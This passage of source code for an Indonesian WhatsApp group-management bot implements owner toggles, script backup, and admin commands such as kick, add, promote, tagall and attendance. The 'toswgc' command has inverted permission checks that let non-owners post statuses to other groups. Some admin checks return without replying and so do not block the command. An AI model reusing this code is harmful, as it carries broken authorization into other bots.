      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: fakeQuoted
        });
      }
    }
break                                    
case 'onlygc': {

if (!isOwner) return reply(mess.owner)
if (args[0] === 'on') {
        if (setting.onlygc) return m.reply('Sudah diaktifkan sebelumnya')
        setting.onlygc = true
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.onlygc) return m.reply('Sudah dinonaktifkan sebelumnya')
        setting.onlygc = false
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: fakeQuoted
        });
      }
    }
break     
case 'autobio': {

if (!isOwner) return reply(mess.owner)
if (args[0] === 'on') {
        if (setting.autobio) return m.reply('Sudah diaktifkan sebelumnya')
        setting.autobio = true
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.autobio) return m.reply('Sudah dinonaktifkan sebelumnya')
        setting.autobio = false
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: fakeQuoted
        });
      }
    }

break               
case 'readchange': case 'autoread':{
if (!isOwner) return reply(mess.owner)
if (args[0] === 'on') {
        if (setting.autoread) return m.reply('Sudah diaktifkan sebelumnya')
        setting.autoread = true
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.autoread) return m.reply('Sudah dinonaktifkan sebelumnya')
        setting.autoread = false
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: fakeQuoted
        });
      }
    }
break
    case 'autotyping': {

if (!isOwner) return reply(mess.owner)
if (args[0] === 'on') {
        if (setting.autotyping) return m.reply('Sudah diaktifkan sebelumnya')
        setting.autotyping = true
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.autotyping) return m.reply('Sudah dinonaktifkan sebelumnya')
        setting.autotyping = false
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: fakeQuoted
        });
      }
    }
break  
case "backupsc":
case "bck":
case "backup": { 
    if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber)
        return m.reply(mess.owner);
    try {
        const tmpDir = "./library/database/Sampah";
        if (fs.existsSync(tmpDir)) {
            const files = fs.readdirSync(tmpDir).filter(f => !f.endsWith(".js"));
            for (let file of files) {
                fs.unlinkSync(`${tmpDir}/${file}`);
            }
        }

        await m.reply("Processing Backup Script . .");

        const name = `${namaBot.replace(/\s+/g, "_")}_Version${version.replace(/\s+/g, "_")}`;
        const exclude = ["node_modules", "Session", "package-lock.json", "yarn.lock", ".npm", ".cache"];
        const filesToZip = fs.readdirSync(".").filter(f => !exclude.includes(f) && f !== "");

        if (!filesToZip.length) return m.reply("Tidak ada file yang dapat di-backup.");

        console.log("Files to zip:", filesToZip);
        execSync(`zip -r ${name}.zip ${filesToZip.join(" ")}`);

        if (!fs.existsSync(`./${name}.zip`)) return m.reply("Gagal membuat file ZIP.");

        await sock.sendMessage(m.sender, {
            document: fs.readFileSync(`./${name}.zip`),
            fileName: `${name}.zip`,
            mimetype: "application/zip"
        }, { quoted: fakeQuoted });

        fs.unlinkSync(`./${name}.zip`);

        if (m.chat !== m.sender) m.reply("Script bot berhasil dikirim ke private chat.");
    } catch (err) {
        console.error("Backup Error:", err);
        m.reply("Terjadi kesalahan saat melakukan backup.");
    }
}
break;

/*
     GROUP
*/
case 'antispam': {
    if (!isAdmins && !isOwner) return m.reply("Khusus admin!");

    if (args[0] === "on") {
        db.chats[m.chat].antispam = true;
        return m.reply("✔️ AntiSpam berhasil diaktifkan!");
    } else if (args[0] === "off") {
        db.chats[m.chat].antispam = false;
        return m.reply("❌ AntiSpam dimatikan!");
    } else {
        return m.reply(`❗ Gunakan:
- antispam on
- antispam off`);
    }
}
break;
 case 'ubahnama':
  case 'setnamegc':
   case 'setsubject': { 
   if (!isGroup) return sock.sendMessage(m.chat, { text: '🚫 Perintah ini hanya untuk grup.' }, { quoted: fakeQuoted }) 
   if (!isBotAdmins) return sock.sendMessage(m.chat, { text: '🚫 Saya harus menjadi admin grup untuk mengubah nama.' }, { quoted: fakeQuoted }) 
   if (!isAdmins) return sock.sendMessage(m.chat, { text: '🚫 Hanya admin grup yang dapat mengubah nama grup.' }, { quoted: fakeQuoted })

const subject = args.join(' ').trim()
if (!subject) return sock.sendMessage(m.chat, { text: `⚠️ Gunakan: ${prefix}ubahnama Nama Grup Baru` }, { quoted: fakeQuoted })

try {
  await sock.groupUpdateSubject(m.chat, subject)
  await sock.sendMessage(m.chat, { text: `✅ Nama grup berhasil diubah menjadi:\n*${subject}*` }, { quoted: fakeQuoted })
} catch (err) {
  console.error('ERR set subject:', err)
  await sock.sendMessage(m.chat, { text: `❌ Gagal mengubah nama grup. Error: ${err.message || err}` }, { quoted: fakeQuoted })
}

} break

  case 'ubahdesc': 
  case 'setdescgc': 
  case 'setdescription': { 
  if (!isGroup) return sock.sendMessage(m.chat, { text: '🚫 Perintah ini hanya untuk grup.' }, { quoted: fakeQuoted }) 
  if (!isBotAdmins) return sock.sendMessage(m.chat, { text: '🚫 Saya harus menjadi admin grup untuk mengubah deskripsi.' }, { quoted: fakeQuoted }) 
  if (!isAdmins) return sock.sendMessage(m.chat, { text: '🚫 Hanya admin grup yang dapat mengubah deskripsi grup.' }, { quoted: fakeQuoted })

// Jika command dijalankan dengan reply ke pesan, gunakan teks yang di-reply sebagai deskripsi
const desc = (args.join(' ').trim()) || (m.quoted && m.quoted.text) || ''
if (!desc) return sock.sendMessage(m.chat, { text: `⚠️ Gunakan: ${prefix}ubahdesc Deskripsi baru\natau reply ke pesan yang berisi deskripsi.` }, { quoted: fakeQuoted })

try {
  await sock.groupUpdateDescription(m.chat, desc)
  await sock.sendMessage(m.chat, { text: `✅ Deskripsi grup berhasil diubah.` }, { quoted: fakeQuoted })
} catch (err) {
  console.error('ERR set description:', err)
  await sock.sendMessage(m.chat, { text: `❌ Gagal mengubah deskripsi grup. Error: ${err.message || err}` }, { quoted: fakeQuoted })
}

} break

case "toswgc": {
  if (!m.isGroup) return m.reply(mess.group);
  if (!isAdmins && !!isOwner) return m.reply(mess.admin);
  if (!isBotAdmins) return m.reply(mess.botadmin);
  const isQuoted = !!m.quoted;
  const mimeType = isQuoted ? (m.quoted.mimetype || m.quoted.mtype) : null;
  const teks = text ? text.trim() : "";
  let media;

  if (isQuoted) media = await m.quoted.download();

  let targetGc = m.chat;
  let caption = teks;

  if (!isOwner && teks.includes("|")) {
    const [idgc, ...rest] = teks.split("|");
    targetGc = idgc.trim();
    caption = rest.join("|").trim();
  }

  let options = {};
  if (isQuoted) {
    if (/image/.test(mimeType)) {
      options = { image: media, caption: caption };
    } else if (/video/.test(mimeType)) {
      options = { video: media, caption: caption };
    } else if (/audio/.test(mimeType)) {
      options = { audio: media, mimetype: "audio/mpeg", ptt: false };
    } else {
      return reply("❌ Hanya bisa gambar, video, audio atau teks untuk status grup!");
    }
  } else if (caption) {
    options = { text: caption };
  } else {
    return reply(`Balas gambar/video/audio atau kasih teks!\nContoh: ${prefix + command} hallo`);
  }

  if (!!isOwner && m.chat !== targetGc) {
    return reply("⚠️ Hanya owner yang bisa kirim status ke grup lain!");
  }

  await groupSatus(targetGc, options);

  await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
}
break;
case 'listabsen': {
    if (!isAdmins) return m.reply(mess.admin)
    if (!m.isGroup) return m.reply(mess.group)
    if (db_absen[m.chat+hariini]) {
    let stringAbsen = `*\`LIST ABSEN [ ${hariini} ]\`*\n\n`
    stringAbsen += db_absen[m.chat+hariini].map(absen => `⭔ @${absen.user_id.split('@')[0]} \n`).join('');    

    let arr_listabsen   = db_absen[m.chat+hariini].map(absen => ({ id: absen.user_id }));
    let jumlahOrangAbsen= arr_listabsen.length;
    let total_orgdgrub  = participants.length;

    let lomAbsen        = total_orgdgrub - jumlahOrangAbsen

    if (lomAbsen == 0) {
         stringAbsen += `\n*${jumlahOrangAbsen}* Orang Telah Absen Semua`
    }else{
         stringAbsen += `\n*${jumlahOrangAbsen}* Orang Telah Absen, Tersisa ${lomAbsen} Orang`
    }

    sock.sendMessage(m.chat, { text: stringAbsen, mentions: arr_listabsen.map(a => a.id) }, { quoted: fakeQuoted })

    } else{
        return reply('Belum ada absen hari ini')
    }
}
break
case 'absen': {
    if (!m.isGroup) return m.reply(mess.group)
    if (!db_absen[m.chat+hariini]) {

        // pertama absen
        db_absen[m.chat+hariini] = [{ user_id: sender, tanggal: hariini }];
        reply('Absen Berhasil')
    }else {

        // absen kedua
      const sudah_absen = db_absen[m.chat+hariini].findIndex(item => item.user_id === sender);

      if (sudah_absen !== -1) {
            reply('Kamu sudah absen hari ini')
        }else {
            reply('Absen Berhasil')
            db_absen[m.chat+hariini].push({ user_id: sender, tanggal: hariini });
        }
          
    }

 fs.writeFileSync('./lib/database/absen.json', JSON.stringify(db_absen))

}
break
case "accall": {
    if (!m.isGroup) return reply("❌ Fitur ini hanya bisa digunakan di grup!")
    if (!isAdmins) return reply("❌ Hanya admin grup yang bisa menggunakan fitur ini!")
    if (!isBotAdmins) return reply("❌ Jadikan bot sebagai admin terlebih dahulu!")

    try {
        let groupMetadata = await sock.groupMetadata(m.chat)
        let pendingRequests = await sock.groupRequestParticipantsList(m.chat)

        if (!pendingRequests || pendingRequests.length === 0)
            return reply("✅ Tidak ada permintaan bergabung yang perlu disetujui!")

        for (let user of pendingRequests) {
            await sock.groupRequestParticipantsUpdate(m.chat, [user.jid], "approve")
        }

        reply(`✅ Berhasil menerima semua *${pendingRequests.length}* permintaan bergabung di grup *${groupMetadata.subject}*!`)
    } catch (e) {
        console.log(e)
        reply("❌ Terjadi kesalahan saat memproses permintaan!")
    }
}
break
case "rejectall": {
    if (!m.isGroup) return reply("❌ Fitur ini hanya bisa digunakan di grup!")
    if (!isAdmins) return reply("❌ Hanya admin grup yang bisa menggunakan fitur ini!")
    if (!isBotAdmins) return reply("❌ Jadikan bot sebagai admin terlebih dahulu!")

    try {
        let groupMetadata = await sock.groupMetadata(m.chat)
        let pendingRequests = await sock.groupRequestParticipantsList(m.chat)

        if (!pendingRequests || pendingRequests.length === 0)
            return reply("✅ Tidak ada permintaan bergabung yang perlu ditolak!")

        for (let user of pendingRequests) {
            await sock.groupRequestParticipantsUpdate(m.chat, [user.jid], "reject")
        }

        reply(`🚫 Semua *${pendingRequests.length}* permintaan bergabung di grup *${groupMetadata.subject}* telah ditolak.`)
    } catch (e) {
        console.log(e)
        reply("❌ Terjadi kesalahan saat memproses penolakan!")
    }
}
break
case "add": {
if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

  let nomor = args[0] ? args[0].replace(/[^0-9]/g, '') : '';
  if (!nomor) return reply('❌ Masukkan nomor!\nContoh: .add 6281234567890');

  let userJid = nomor + '@s.whatsapp.net';

  try {
    // Coba langsung tambah ke grup
    const res = await sock.groupParticipantsUpdate(m.chat, [userJid], 'add');

    // Jika gagal tambah langsung, kirim invite
    const status = res[0]?.status;
    if (status === 403 || status === 408 || status === 401) {
      let inviteCode = await sock.groupInviteCode(m.chat);
      let inviteLink = `https://chat.whatsapp.com/${inviteCode}`;
      await sock.sendMessage(userJid, {
        text: `👋 Halo! Kamu diundang untuk bergabung ke grup *${groupMetadata.subject}*\n\nKlik link di bawah untuk bergabung:\n${inviteLink}`
      });
      reply(`✅ Tidak dapat menambah langsung.\nTapi undangan telah dikirim ke nomor: +${nomor}`);
    } else if (status === 200) {
      reply(`✅ Berhasil menambahkan nomor +${nomor} ke grup!`);
    } else {
      reply(`⚠️ Gagal menambah nomor +${nomor}.`);
    }

  } catch (e) {
    console.error(e);
    reply('❌ Terjadi kesalahan saat menambah member!');
  }

} break
case 'list': {
    if (!m.isGroup) return reply(mess.group)
    if (!isAdmins) return reply(`Khusus admin kak, dan jadikan bot admin terlebih dahulu`)
    if (db_respon_list.length === 0) return reply(`Belum ada list respon didalam database!`)
    if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return reply(`Belum ada list respon didalam grup ini!`)

    // Ambil data list respon khusus grup ini
    let sections = []
    for (let i of db_respon_list) {
        if (i.id === m.chat) {
            sections.push({
                header: "List Respon",
                title: i.key.toUpperCase(),
                description: `Kirim *${i.key.toUpperCase()}* ke bot untuk detail.`,
                id: `${i.key}`
            })
        }
    }

    // Jika tidak ada data
    if (sections.length === 0) return reply(`Belum ada list respon di grup ini!`)

    // Buat button interaktif
    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `Halo ${pushname}, berikut list respon di grup ini.`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: name
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: `Klik Button Untuk Melihat List Respon`,
                        subtitle: name,
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "single_select",
                                "buttonParamsJson": JSON.stringify({
                                    title: "List Respon",
                                    sections: [
                                        {
                                            title: `${name}`,
                                            rows: sections
                                        }
                                    ]
                                })
                            }
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: false,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: '0@newsletter',
                            newsletterName: name,
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, { quoted: fakeQuoted })

    await sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
}
break

case 'addlist':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return (`khusus admin kak, dan jadikan bot admin terlebih dahulu`)
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return reply(`Gunakan dengan cara ${cmd} key|respon\n\nContoh: ${cmd} tes|apa`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return reply(`List respon dengan key: ${args1}\nSudah ada digrup ini!`)
if (/image/.test(mime)) {
  let qw = m.quoted ? quoted : m
  let media = await sock.downloadAndSaveMediaMessage(qw)
  const url = await CatBox(media)
      addResponList(m.chat, args1, args2, true, url, db_respon_list)
      reply(`Sukses addlist respon\nKey: ${args1}`)
      if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
  addResponList(m.chat, args1, args2, false, '-', db_respon_list)
  reply(`Sukses addlist respon\nKey: ${args1}`)
}
break

case 'dellist':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return (`khusus admin kak, dan jadikan bot admin terlebih dahulu`)
if (db_respon_list.length === 0) return reply(`Belum ada list respon didalam database!`)
if (!text) return reply(`Gunakan dengan xara ${cmd} key\n\nContoh: ${cmd} tes`)
if (!isAlreadyResponList(m.chat, q.toLowerCase(), db_respon_list)) return reply(`List respon dengan key: ${q}\ntidak ada didalam grup ini!`)
delResponList(m.chat, q.toLowerCase(), db_respon_list)
reply(`Sukses dellist respon dengan key: ${q}`)
break

case 'update':
case 'updatelist':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return (`khusus admin kak, dan jadikan bot admin terlebih dahulu`)
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return reply(`Gunakan dengan cara ${cmd} key|respon\n\nContoh: ${cmd} tes|apa`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar digrup ini!`)
if (/image/.test(mime)) {
  let qw = m.quoted ? quoted : m
  let media = await sock.downloadAndSaveMediaMessage(qw)
  const url = await CatBox(media)
      updateResponList(m.chat, args1, args2, true, url, db_respon_list)
      reply(`Berhasil update respon list dengan key *${args1}*`)
      if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
  updateResponList(m.chat, args1, args2, false, '-', db_respon_list)
  reply(`Berhasil update respon list dengan key *${args1}*`)
}
break
case 'addbadwords': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isBotAdmins) return (`khusus admin kak, dan jadikan bot admin terlebih dahulu`)
if (!text) return reply(`Penggunaan ${cmd} anjing`)
addbadwords(text)
}
break

case 'deletebadwords': case 'delbadwords': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isBotAdmins) return (`khusus admin kak, dan jadikan bot admin terlebih dahulu`)
if (!text) return reply(`Penggunaan ${cmd} anjing`)
deletebadwords(text)
}
break
case 'antijudol':
    handleFeatureToggle('antijudol', command);
    break;

case 'antimention':
case 'antitagsw':
    handleFeatureToggle('antimention', command);
    break;

case 'antilink':
case 'antilinkgc':
    handleFeatureToggle('Antilinkgc', command);
    break;

case 'antilink2':
case 'antilinkch':
    handleFeatureToggle('Antilinkch', command);
    break;

case 'antilink3':
case 'antiwame':
    handleFeatureToggle('antiWame', command);
    break;

case 'antilink4':
case 'antilinkig':
    handleFeatureToggle('Antilinkig', command);
    break;
case 'mutegc':
case 'mute':
    handleFeatureToggle('mute', command);
    break;

case 'antilinkall':
    handleFeatureToggle('Antilinkall', command);
    break;
case 'antifoto':
    handleFeatureToggle('antifoto', command);
    break;
case 'antivideo':
    handleFeatureToggle('antivideo', command);
    break;
case 'onlyadmin':
    handleFeatureToggle('onlyadmin', command);
    break;
case 'autodl':
case 'autodownload':
    handleFeatureToggle('autodl', command);
    break;
case 'delete':
			case 'd':
			case 'del': {
			
if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

				if (!m.quoted) return reply('Kak, kamu perlu mengirim pesan yang mau dihapus ya! 🤔')
				await sock.sendMessage(m.chat, {
					delete: {
						remoteJid: m.chat,
						id: m.quoted.id,
						participant: m.quoted.sender
					}
				})
			}
			break
			 case'dor': case "kick": case "kik": {

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await sock.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await sock.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply("@tag/reply")
}
}

break
case "linkgc": {

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

const urlGrup = "https://chat.whatsapp.com/" + await sock.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await sock.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: fakeQuoted})
}

break
case "resetlinkgc": {

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

await sock.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}

break
case "totag":{
if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
 let users = participants.map(u => u.id).filter(v => v !== sock.user.jid)
 if (!m.quoted) return reply(`✳️ Reply to a message`)
 sock.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: users } )
}
break
case 'closetime':

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
 reply(`Close time ${q} dimulai dari sekarang`)
setTimeout( () => {
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
sock.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
break

case "opentime": {

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')
}
reply(`Open Time ${q} Dimulai Dari Sekarang`)
setTimeout(() => {
const nomor = m.participant
const open = `*Tepat Waktu* Grup Dibuka Oleh Admin\nSekarang Member Dapat Mengirim Pesan`
sock.groupSettingUpdate(m.chat, 'not_announcement')
reply(open)
}, timer)
}

break


case "demote":
case "promote": {

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await sock.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await sock.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: fakeQuoted})
})
} else {
return m.reply("@tag/6285###")
}
}

break
case 'delppgc':{

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

await sock.removeProfilePicture(from)
}
break
case 'setppgroup':
case 'setppgc': {
  if (!isGroup) return reply(mess.group);
  if (!isAdmins && !isOwner) return reply(mess.admin);
  if (!isBotAdmins) return reply(mess.botadmin);

  // ambil quoted / direct
  const quoted = m.quoted ? m.quoted : m;
  let mime = (quoted.msg || quoted).mimetype || quoted.mimetype || '';
  if (!mime) {
    if (quoted.message?.imageMessage) mime = 'image/jpeg';
    if (quoted.message?.documentMessage?.mimetype?.startsWith?.('image/')) 
      mime = quoted.message.documentMessage.mimetype;
  }

  if (!mime || !mime.includes('image')) return reply(`Kirim/Reply gambar dengan caption *${cmd}*`);
  if (mime.includes('webp')) return reply('Format WEBP tidak bisa jadi foto profil grup. Pakai JPG/PNG.');

  try {
    reply('⏳ Sedang mengganti foto profil grup...');

    // download media -> Buffer
    let buffer = await sock.downloadMediaMessage(quoted);

    // 1) coba upload langsung (paling sering work)
    try {
      await sock.updateProfilePicture(m.chat, buffer);
      return reply('✔️ Foto profil grup berhasil diganti (upload buffer)!');
    } catch (e1) {
      console.warn('[setppgc] updateProfilePicture(buffer) failed', e1);
    }

    // 2) fallback: kirim sebagai object { url: buffer } (beberapa versi menerima ini)
    try {
      await sock.updateProfilePicture(m.chat, { url: buffer });
      return reply('✔️ Foto profil grup berhasil diganti (upload {url:buffer})!');
    } catch (e2) {
      console.warn('[setppgc] updateProfilePicture({url:buffer}) failed', e2);
    }

    // 3) optional: jika library punya helper generateProfilePicture -> gunakan untuk resize/crop
    try {
      // attempt access to helper (may be exported from lib or socket)
      const genFunc = sock.generateProfilePicture || (require('@whiskeysockets/baileys').generateProfilePicture);
      if (typeof genFunc === 'function') {
        const gen = await genFunc(buffer, { width: 720, height: 720 });
        const imgBuf = gen.img || buffer;
        await sock.updateProfilePicture(m.chat, imgBuf);
        return reply('✔️ Foto profil grup berhasil diganti (generateProfilePicture)!');
      }
    } catch (e3) {
      console.warn('[setppgc] generateProfilePicture fallback failed', e3);
    }

    // tak ada yang berhasil
    reply('❌ Gagal mengganti foto profil grup — coba cek permission bot (harus admin) atau ukuran/format gambar.');
  } catch (err) {
    console.error('[ERR setppgc]', err);
    reply('❌ Terjadi error saat mengganti foto profil grup.');
  }
}
break;
case 'tagall':{
if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
const textMessage = args.join(" ") || "nothing";
let teks = `tagall message :\n> *${textMessage}*\n\n`;
const groupMetadata = await sock.groupMetadata(m.chat);
const participants = groupMetadata.participants;
for (let mem of participants) {
teks += `@${mem.id.split("@")[0]}\n`;
}
sock.sendMessage(m.chat, {
text: teks,
mentions: participants.map((a) => a.id)
}, { quoted: fakeQuoted });
}
break 
case 'tagseder': {
    if (!isGroup) return reply(mess.group);
    if (!isAdmins && !isOwner) return reply(mess.admin);
    if (!isBotAdmins) return reply(mess.botadmin);

    const groupMetadata = await sock.groupMetadata(m.chat);

    if (!groupMetadata || !groupMetadata.participants) {
        return reply("Gagal mengambil data grup");
    }

    const participants = groupMetadata.participants;

    let teks = "📌 *TAG SEDER (MEMBER OFFLINE 2 MENIT)*\n\n";
    let mentions = [];

    // batas aktif 2 menit
    const batasAktif = 2 * 60 * 1000;

    if (!db.active) db.active = {};

    for (let mem of participants) {

        if (!mem || !mem.id) continue;

        let id = mem.id;

        // jangan tag pengirim perintah
        if (id === m.sender) continue;

        let lastActive = db.active[id] ? db.active[id] : 0;

        // kalau masih aktif dalam 2 menit -> jangan di-tag
        if (Date.now() - lastActive < batasAktif) continue;

        teks += `@${id.split("@")[0]}\n`;
        mentions.push(id);
    }

    if (mentions.length === 0) {
        return reply("Semua member masih aktif dalam 2 menit terakhir 👍");
    }

    sock.sendMessage(m.chat, {
        text: teks,
        mentions: mentions
    });

}
break         
case "h":
case "hidetag": {
if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
if (m.quoted) {
sock.sendMessage(m.chat, {
forward: m.quoted.fakeObj,
mentions: participants.map(a => a.id)
})
}
if (!m.quoted) {
sock.sendMessage(m.chat, {
text: q ? q : '',
mentions: participants.map(a => a.id)
}, { quoted: fakeQuoted })
}
}
break 
case "closegc": case "close": 
case "opengc": case "open": {
if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
if (/open|opengc/.test(command)) {
if (groupMetadata.announce == false) return 
await sock.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (groupMetadata.announce == true) return 
sock.groupSettingUpdate(m.chat, 'announcement')
} else {}
}

break        
case 'afk': {
if (!m.isGroup) return reply(mess.group);
 let reason = text ? text : 'Coli'

 // Cek kalau user udah afk
 if (afk.checkAfkUser(m.sender, _afk)) {
 return reply('Kan udah tadi😠.')
 }

 let obj = {
 id: m.sender,
 time: Date.now(),
 reason
 }
 _afk.push(obj)
 fs.writeFileSync('./lib/database/user.json', JSON.stringify(_afk))

 sock.sendMessage(m.chat, {text:`@${m.sender.split("@")[0]} menghilang dari lane\n\n*Reason:* ${reason}`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
break;         

/*
    OTHER
